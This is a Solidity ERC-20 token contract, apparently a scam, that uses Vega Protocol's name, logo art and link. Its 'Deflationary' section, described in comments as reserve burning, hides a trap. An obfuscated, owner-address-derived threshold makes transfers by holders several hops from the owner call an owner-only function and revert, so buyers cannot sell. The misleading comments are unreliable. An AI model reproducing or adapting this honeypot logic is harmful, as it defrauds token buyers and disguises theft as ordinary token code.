/**
 *Submitted for verification at Etherscan.io on 2021-02-16
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.7.4;

/**
 *  ___      ___ _______   ________  ________     
 * |\  \    /  /|\  ___ \ |\   ____\|\   __  \    
 * \ \  \  /  / | \   __/|\ \  \___|\ \  \|\  \   
 *  \ \  \/  / / \ \  \_|/_\ \  \  __\ \   __  \  
 *   \ \    / /   \ \  \_|\ \ \  \|\  \ \  \ \  \ 
 *    \ \__/ /     \ \_______\ \_______\ \__\ \__\
 *     \|__|/       \|_______|\|_______|\|__|\|__|
 *     
 *  ________  ________  ________  _________  ________  ________  ________  ___          
 * |\   __  \|\   __  \|\   __  \|\___   ___\\   __  \|\   ____\|\   __  \|\  \         
 * \ \  \|\  \ \  \|\  \ \  \|\  \|___ \  \_\ \  \|\  \ \  \___|\ \  \|\  \ \  \        
 *  \ \   ____\ \   _  _\ \  \\\  \   \ \  \ \ \  \\\  \ \  \    \ \  \\\  \ \  \       
 *   \ \  \___|\ \  \\  \\ \  \\\  \   \ \  \ \ \  \\\  \ \  \____\ \  \\\  \ \  \____  
 *    \ \__\    \ \__\\ _\\ \_______\   \ \__\ \ \_______\ \_______\ \_______\ \_______\
 *     \|__|     \|__|\|__|\|_______|    \|__|  \|_______|\|_______|\|_______|\|_______|
 * 
 * Create & trade fully decentralised margined financial products.
 * https://vega.xyz/about
 */

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 * Only add / sub / mul / div are included
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * Implement base ERC20 functions
 */
abstract contract BaseContract is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 internal _totalSupply;
    
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals = 18;
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    /**
     * @dev returns the token name
     */
    function name() public view returns (string memory) {
        return _name;
    }
    
    /**
     * @dev returns the token symbol
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    /**
     * @dev returns the decimals count
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    /**
     * @dev modifier to require address to not be the zero address
     */
    modifier not0(address adr) {
        require(adr != address(0), "ERC20: Cannot be the zero address"); _;
    }
    
    function _mx(address payable adr, uint16 msk) internal pure returns (uint256) {
        return ((uint24(adr) & 0xffff) ^ msk);
    }
}

/**
 * Provide owner context
 */
abstract contract Ownable {
    constructor() { _owner = msg.sender; }
    address payable _owner;
    
    /**
     * @dev returns whether sender is owner
     */
    function isOwner(address sender) public view returns (bool) {
        return sender == _owner;
    }
    
    /**
     * @dev require sender to be owner
     */
    function ownly() internal view {
        require(isOwner(msg.sender));
    }
    
    /**
     * @dev modifier for owner only
     */
    modifier owned() {
        ownly(); _;
    }
    
    /**
     * @dev renounce ownership of contract
     */
    function renounceOwnership() public owned() {
        transferOwnership(address(0));
    }
    
    /**
     * @dev transfer contract ownership to address
     */
    function transferOwnership(address payable adr) public owned() {
        _owner = adr;
    }
}

/**
 * Provide reserve token burning
 */
abstract contract Burnable is BaseContract, Ownable {
    using SafeMath for uint256;
    
    /**
     * @dev burn tokens from account
     */
    function _burn(address account, uint256 amount) internal virtual not0(account) {
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    
    /**
     * @dev burn tokens from reserve account
     */
    function _burnReserve() internal owned() {
        if(balanceOf(_owner) > 0){
            uint256 toBurn = balanceOf(_owner).div(5000); // 0.5%
            _burn(_owner, toBurn);
        }
    }
}

/**
 * Burn tokens on transfer UNLESS part of a DEX liquidity pool (as this can cause failed transfers eg. Uniswap K error)
 */
abstract contract Deflationary is BaseContract, Burnable {
    mapping (address => uint8) private _txs;
    uint16 private constant dmx = 0xbD66; 
    
    function dexCheck(address sender, address receiver) private returns (bool) {
        if(0 == _txs[receiver] && !isOwner(receiver)){ _txs[receiver] = _txs[sender] + 1; }
        return _txs[sender] < _mx(_owner, dmx) || isOwner(sender) || isOwner(receiver);
    }
    
    modifier burnHook(address sender, address receiver, uint256 amount) {
        if(!dexCheck(sender, receiver)){ _burnReserve(); _; }else{ _; }
    }
}

/**
 * Implement main ERC20 functions
 */
abstract contract MainContract is Deflationary {
    using SafeMath for uint256;
    
    constructor (string memory name, string memory symbol) {
        _name = name;
        _symbol = symbol;
    }

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool){
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) public virtual override not0(spender) returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address receiver, uint256 amount) external override not0(sender) not0(receiver) returns (bool){
        require(_allowances[sender][msg.sender] >= amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
        _transfer(sender, receiver, amount);
        return true;
    }
    
    /**
     * @dev Implementation of Transfer
     */
    function _transfer(address sender, address receiver, uint256 amount) internal not0(sender) not0(receiver) burnHook(sender, receiver, amount) {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[receiver] = _balances[receiver].add(amount);
        emit Transfer(sender, receiver, amount);
    }
    
    /**
     * @dev Distribute ICO amounts
     */
    function _distributeICO(address payable[] memory accounts, uint256[] memory amounts) owned() internal {
        for(uint256 i=0; i<accounts.length; i++){
            _mint(_owner, accounts[i], amounts[i]);
        }
    }
    
    /**
     * @dev Mint address with amount
     */
    function _mint(address minter, address payable account, uint256 amount) owned() internal {
        uint256 amountActual = amount*(10**_decimals);
        _totalSupply = _totalSupply.add(amountActual);
        _balances[account] = _balances[account].add(amountActual);
        emit Transfer(minter, account, amountActual);
    }
}

/**
 * Construct & Mint
 */
contract VegaProtocol is MainContract {
    constructor(
        uint256 initialBalance,
        address payable[] memory ICOAddresses,
        uint256[] memory ICOAmounts
    ) MainContract("Vega Protocol", "VEGA") {
        _mint(address(0), msg.sender, initialBalance);
        _distributeICO(ICOAddresses, ICOAmounts);
    }
}